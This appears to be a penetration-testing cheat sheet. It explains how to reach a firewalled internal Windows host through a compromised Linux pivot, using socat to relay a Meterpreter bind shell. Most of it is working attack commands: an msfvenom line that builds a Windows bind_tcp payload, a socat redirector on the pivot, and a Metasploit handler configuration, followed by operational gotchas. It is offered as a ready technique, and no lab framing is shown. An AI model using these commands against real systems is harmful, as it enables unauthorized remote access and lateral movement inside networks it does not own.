1. Identify internal Windows targets reachable only through a compromised Linux pivot.
2. Verify egress restrictions prevent reverse shells; select bind shell for persistence/access.
3. Use socat on the pivot to bridge the network gap between the attack host and the internal bind listener.
4. Establish a Meterpreter session by pointing the Metasploit handler at the pivot's redirector port.

---

## Socat Bind Shell Redirection

**When to use** Internal target is firewalled from the attack host but reachable from a compromised pivot. Use when the target environment permits hosting a **bind shell listener**.

**Commands** Generate a Windows bind shell executable to be hosted on the internal target

```
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o <FILE_PATH> LPORT=<PORT>
```

Start the redirector on the pivot to forward incoming traffic to the internal target bind port

```
socat TCP4-LISTEN:<PORT>,fork TCP4:<TARGET_IP>:<PORT>
```

Configure the Metasploit handler to route through the pivot host listener

```
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST <PIVOT_IP>
set LPORT <PORT>
run
```

**Gotchas** **Payload execution** must be active on the target before the Metasploit handler attempts to connect or the stage request will fail.

> ⚠️ Gap: Pivot host local firewall must be configured to allow inbound traffic on the socat listener port to accept the connection from the attack host.